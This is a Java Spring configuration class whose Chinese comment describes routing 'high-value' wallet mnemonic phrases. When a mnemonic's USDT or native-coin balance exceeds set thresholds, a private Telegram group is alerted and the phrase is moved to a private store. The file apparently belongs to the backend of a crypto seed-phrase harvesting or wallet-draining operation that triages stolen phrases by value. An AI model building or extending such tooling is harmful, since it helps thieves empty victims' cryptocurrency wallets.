package com.consume.config;

import lombok.Data;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.stereotype.Component;

import java.math.BigDecimal;
import java.util.HashMap;
import java.util.Map;

/**
 * 高额助记词分流：USDT 合计或任一条原生币超阈值 → 隐私群通知 + 迁 private_mnemonic。
 */
@Data
@Component
@ConfigurationProperties(prefix = "maxnotice")
public class MaxNoticeProperties {

    private boolean enabled = true;

    private BigDecimal usdtSumThreshold = new BigDecimal("1000");

    private Map<String, BigDecimal> nativeThresholds = new HashMap<>();

    private String tgBotToken = "";

    private String tgGroupId = "";

    public boolean isPrivateTgConfigured() {
        if (tgBotToken == null || tgBotToken.trim().isEmpty()
                || tgGroupId == null || tgGroupId.trim().isEmpty()) {
            return false;
        }
        String token = tgBotToken.trim();
        String group = tgGroupId.trim();
        // 防配反：token 形如 123456:AA...；群 id 一般为数字（可带负号）
        if (!token.contains(":") || group.contains(":")) {
            return false;
        }
        return true;
    }
}
